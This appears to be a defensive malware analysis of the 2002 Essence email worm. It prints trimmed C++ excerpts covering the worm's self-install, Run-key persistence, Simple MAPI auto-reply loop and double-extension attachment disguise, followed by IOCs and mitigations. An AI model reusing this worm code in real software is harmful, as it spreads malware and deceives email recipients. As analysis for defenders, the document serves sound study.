# Dissecting W32.HLLW.Essence (2002): Simple MAPI auto‑reply worm in C++ 🛠️🔍

> "This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes."

## Introduction

W32.HLLW.Essence (aka I‑Worm.Essence) is a compact email worm written in C++ in early 2002. It installs itself into the Windows System directory and persists via an HKLM Run value. Rather than scanning the address book, Essence implements an auto‑reply loop: it logs on to Simple MAPI, watches for unread messages, and replies to each originator with a crafted message and a deceptive attachment name that uses double extensions. The source shows a handful of engineering quirks (case‑sensitive path comparison, subject space padding, and string logic bugs) that influence behavior on real systems. This analysis highlights the flow, IOCs, and safe code excerpts to help analysts recognize and document the sample.

## Overview 🔍

- Platform: Win9x/ME/2000/XP era; Win32 C++ with dynamic MAPI loading.
- Install/persist:
  - Copies itself to `%System%\Msie32.exe`.
  - Adds `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft IE = %System%\Msie32.exe`.
  - Shows a decoy message box: “Software installed on the system.”
- Email propagation:
  - Loads MAPI functions at runtime, opens a new session, and enters a message loop.
  - Repeatedly finds unread messages, reads the envelope/body, composes an "auto‑reply" with a short body and the original subject prefixed by `Re:`.
  - Attaches the worm executable but uses a randomized, benign‑looking file name with double extensions (e.g., `readme.jpg.exe`).
  - Modifies the original message subject by appending two trailing spaces and saves it (used as a processed marker).
- Notable quirks/bugs:
  - Case mismatch: compares the current module path against `%System%\MSIE32.EXE` (uppercase) but installs as `%System%\Msie32.exe` (mixed case). Because `lstrcmp` is case‑sensitive, the comparison often fails and the worm may repeatedly install and exit instead of running its MAPI loop.
  - String logic bugs in SMTP server heuristic and body composition (unused/overlapping variables).

## Section 2 – Source Code Analysis 🧩

Short, real excerpts from `essence.cpp` illustrating core behaviors. Snippets are inert and trimmed.

### 2.1 Installation and HKLM Run value

```cpp
// Build %System%\Msie32.exe, copy self, and persist under "Microsoft IE"
GetModuleFileName(hInst, filename, 100);
GetSystemDirectory((char *)sysdir, 100);
strcpy(sysdr, sysdir);
strcat(sysdr, "\\MSIE32.EXE");
if ((lstrcmp(filename, sysdr)) != 0) {
    Welcome();
    strcat(sysdir, "\\Msie32.exe");
    CopyFile(filename, sysdir, FALSE);
    RegOpenKeyEx(HKEY_LOCAL_MACHINE, Run, 0, KEY_WRITE, &hReg);
    RegSetValueEx(hReg, "Microsoft IE", 0, REG_SZ, (BYTE*)sysdir, 100);
    RegCloseKey(hReg);
    return 0; // exit after install
}
```

Impact: Creates a conventional autorun. Due to case‑sensitive `lstrcmp`, the equality test often fails on the next run (uppercase vs mixed case), causing the process to reinstall and exit, preventing the propagation loop.

### 2.2 Dynamic MAPI load and session

```cpp
// Resolve MAPI32.DLL exports and start a new session
hMAPI = LoadLibrary("MAPI32.DLL");
(FARPROC&)mLogon    = GetProcAddress(hMAPI, "MAPILogon");
(FARPROC&)mLogoff   = GetProcAddress(hMAPI, "MAPILogoff");
(FARPROC&)mFindNext = GetProcAddress(hMAPI, "MAPIFindNext");
(FARPROC&)mReadMail = GetProcAddress(hMAPI, "MAPIReadMail");
(FARPROC&)mSaveMail = GetProcAddress(hMAPI, "MAPISaveMail");
(FARPROC&)mSendMail = GetProcAddress(hMAPI, "MAPISendMail");
(FARPROC&)mFreeBuffer = GetProcAddress(hMAPI, "MAPIFreeBuffer");

mLogon(NULL, NULL, NULL, MAPI_NEW_SESSION, NULL, &sess);
SetThreadPriority(NULL, THREAD_PRIORITY_LOWEST);
```

Impact: No profile prompt control or error handling beyond basic null checks; it relies on a default MAPI profile and runs a Windows message pump while polling for unread messages.

### 2.3 Auto‑reply loop over unread messages

```cpp
// Loop messages and auto‑reply to each unread originator
while (GetMessage(&msg, NULL, 0, 0))
  if (mFindNext(sess, 0, NULL, NULL, MAPI_LONG_MSGID | MAPI_UNREAD_ONLY, NULL, messId) == SUCCESS_SUCCESS) {
    do {
      if (mReadMail(sess, NULL, messId, MAPI_ENVELOPE_ONLY | MAPI_PEEK, NULL, &mess) == SUCCESS_SUCCESS) {
        if (lstrlen(mess->lpszSubject) > 2 &&
            mess->lpszSubject[strlen(mess->lpszSubject)-1] != ' ' &&
            mess->lpszSubject[strlen(mess->lpszSubject)-2] != ' ') {
          mFreeBuffer(mess);
          SetThreadPriority(NULL, THREAD_PRIORITY_HIGHEST);
          if (mReadMail(sess, NULL, messId, MAPI_SUPPRESS_ATTACH | MAPI_PEEK, NULL, &mess) == SUCCESS_SUCCESS) {
            // ... build reply body/subject, send, and mark original ...
          }
        } else mFreeBuffer(mess);
      }
    } while (mFindNext(sess, 0, NULL, messId, MAPI_LONG_MSGID | MAPI_UNREAD_ONLY, NULL, messId) == SUCCESS_SUCCESS);
  }
```

Impact: Uses a simple condition to avoid processing messages already modified (trailing two spaces in subject). Elevates thread priority during processing, then lowers it.

### 2.4 Compose and send with deceptive attachment name

```cpp
// Randomized double‑extension attachment and Simple MAPI send
char *name[] = {"readme","clickme","lookthis","urgent","newgame","winanholiday","hello","ForU","important"};
char *ext1[] = {".mp3",".htm",".jpg",".gif",".html",".mpeg",".mpg",".htm",".vbs",".zip",".rar"};
char *ext2[] = {".exe",".com",".pif",".scr"};
attname[0] = 0;
strcat(attname, name[GetTickCount() & 8]);
strcat(attname, ext1[GetTickCount() & 10]);
strcat(attname, ext2[GetTickCount() & 3]);

MapiMessage mes = {0};
MapiRecipDesc from = {0};
mes.lpszSubject = msubject;  // e.g., "Re: <original>"
mes.lpszNoteText = mbody;    // "auto‑reply" text
// one TO recipient (originator)
// one attachment: mes.lpFiles->lpszPathName = filename; mes.lpFiles->lpszFileName = attname;
mSendMail(sess, 0, &mes, 0, 0);
```

Impact: The attachment path points to the current executable, but the display name is randomized to look benign (e.g., `readme.jpg.exe`). This is a classic social‑engineering tactic.

### 2.5 Mark the original message and show decoy UI

```cpp
// Mark processed mail by padding the subject with two spaces
wsprintf(subject, "Re: %s  ", mess->lpszSubject);
wsprintf(address, "%s", mess->lpOriginator->lpszAddress);
MessageBox(NULL, body, subject, MB_OK | MB_ICONINFORMATION); // decoy
sendmail(sess, subject, body, address);

char *tmp = (char*)malloc(strlen(mess->lpszSubject) + 3);
strcpy(tmp, mess->lpszSubject);
free(mess->lpszSubject);
tmp[strlen(tmp) + 2] = 0; // ensure NUL
tmp[strlen(tmp)] = ' ';
tmp[strlen(tmp) - 1] = ' ';
mess->lpszSubject = tmp;
mSaveMail(sess, NULL, mess, MAPI_LONG_MSGID, NULL, messId);
```

Impact: The UI popup serves as a plausible "auto‑reply" action. The subject padding acts as a simple processed marker read by the earlier condition.

## Artifacts and IOCs

Files:
- `%System%\Msie32.exe` (installed copy)

Registry:
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Microsoft IE = %System%\Msie32.exe`

Network/Email:
- Simple MAPI traffic originating from the local client profile.
- Auto‑reply pattern with subject starting `Re: <subject>` and two trailing spaces.
- Body text includes a leading quoted section and lines like: `I can not reply now. Look at this attachment and mail me if you have some suggests.`
- Attachments presented as double‑extension names from small dictionaries (e.g., `clickme.gif.com`, `readme.zip.exe`). The attached file is the sender’s executable.

User‑visible:
- Setup dialog: “Software installed on the system.”
- Per‑message information dialog presenting the reply subject/body (decoy UI).

## Code quirks, bugs, and engineering notes

- Case sensitivity pitfall: `lstrcmp(filename, "%System%\\MSIE32.EXE")` vs actual installed `Msie32.exe` means the equality test usually fails; the worm may keep reinstalling and exiting instead of running the MAPI loop.
- Weak SMTP domain inference: Code tries to derive `smtp.<domain>` from an `address` buffer with conflicting index variables; a fallback hardcodes `smtp.yahoo.com`. The derived value is only shown in the message body, not used for network delivery.
- Subject padding: Using two trailing spaces as a processed marker is brittle but sufficient for the worm’s own logic.
- Memory handling: Frees `mess->lpszSubject` and replaces it with a newly allocated buffer; depends on MAPI freeing rules elsewhere, but it works under many clients of that era.

## Mitigation and Defense Strategies 🛡️

### Detection (Analyst focus)
- Autorun IOC: `HKLM\...\Run\Microsoft IE` pointing to `%System%\Msie32.exe`.
- Behavioral: bursts of Simple MAPI sends immediately after receipt of unread mail; subjects prefixed `Re:` with two trailing spaces.
- Attachment traits: double‑extension names from small dictionaries; the binary is the sender’s executable.
- UI: unexpected “Software installed on the system.” dialog followed by informational popups on message handling.

### Prevention (Admin focus)
- Lock down email automation: enforce modern client protections against Simple MAPI/COM programmatic send.
- Application allow‑listing: block unknown executables from `%System%` and user‑writable locations.
- Endpoint controls: EDR rules for processes dynamically loading `MAPI32.DLL` and invoking `MAPILogon`/`MAPISendMail` in tight loops.
- Email gateway: strip/block executable attachments and flag double‑extension patterns (`*.jpg.exe`, `*.zip.scr`, etc.).
- Least privilege: prevent standard users from writing to `%System%` or setting HKLM Run.

## Conclusion

Essence is a straightforward auto‑replying email worm: it installs via an HKLM Run value and leverages Simple MAPI to respond to unread messages with a deceptive double‑extension attachment. The source reveals tell‑tale artifacts (Run value name, dialog strings, subject padding behavior) and a subtle installation bug that may hinder propagation on real systems. Standard controls—blocking executable attachments, restricting email automation APIs, and enforcing application allow‑listing—significantly blunt this technique even on legacy environments.
